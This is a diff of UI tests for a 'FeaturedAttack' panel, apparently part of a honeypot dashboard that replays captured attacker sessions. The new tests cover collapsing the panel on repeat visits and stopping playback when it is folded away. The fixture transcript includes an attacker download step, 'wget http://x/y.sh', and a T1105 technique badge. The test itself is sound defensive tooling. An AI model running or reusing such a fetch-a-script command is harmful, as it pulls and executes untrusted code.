@@ -335,14 +335,42 @@ describe("FeaturedAttack", () => {
     expect(screen.getByRole("button", { name: /pause/i })).toBeInTheDocument();
   });
 
-  it("shows the finished transcript immediately on a repeat visit", () => {
+  it("collapses on a repeat visit", () => {
+    // The tallest panel on the page, and the returning viewer has already read
+    // it — it should not be in the way of everything below it.
+    window.localStorage.setItem("hunajapannu:replayed-session", "abc123");
+    render(<FeaturedAttack {...props} />);
+    expect(screen.getByRole("button", { name: /show/i })).toBeInTheDocument();
+    // Header stays: which attacker this was is the point of the summary.
+    expect(screen.getByText(/1\.2\.3\.4/)).toBeInTheDocument();
+    // Transcript and technique badges are folded away.
+    expect(screen.queryByTitle("Ingress Tool Transfer (T1105)")).toBeNull();
+    expect(screen.getByText(/session ended/)).not.toBeVisible();
+  });
+
+  it("shows the finished transcript, not the animation, when reopened", () => {
     // The annoyance this exists to fix: watching the same typing animation
     // every single time you open the page.
     window.localStorage.setItem("hunajapannu:replayed-session", "abc123");
     render(<FeaturedAttack {...props} />);
-    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
-    expect(screen.getByText(/session ended/)).toBeInTheDocument();
+    fireEvent.click(screen.getByRole("button", { name: /show/i }));
+    expect(screen.getByText("wget http://x/y.sh")).toBeVisible();
+    expect(screen.getByText(/session ended/)).toBeVisible();
     expect(screen.getByRole("button", { name: /replay/i })).toBeInTheDocument();
+  });
+
+  it("expands on a first visit", () => {
+    render(<FeaturedAttack {...props} />);
+    expect(screen.getByRole("button", { name: /hide/i })).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: /show/i })).toBeNull();
+  });
+
+  it("stops playback when collapsed, so it is not half over on reopening", () => {
+    render(<FeaturedAttack {...props} />);
+    fireEvent.click(screen.getByRole("button", { name: /hide/i }));
+    fireEvent.click(screen.getByRole("button", { name: /show/i }));
+    expect(screen.getByRole("button", { name: /play/i })).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: /pause/i })).toBeNull();
   });
 
   it("animates again when a genuinely different session is featured", () => {
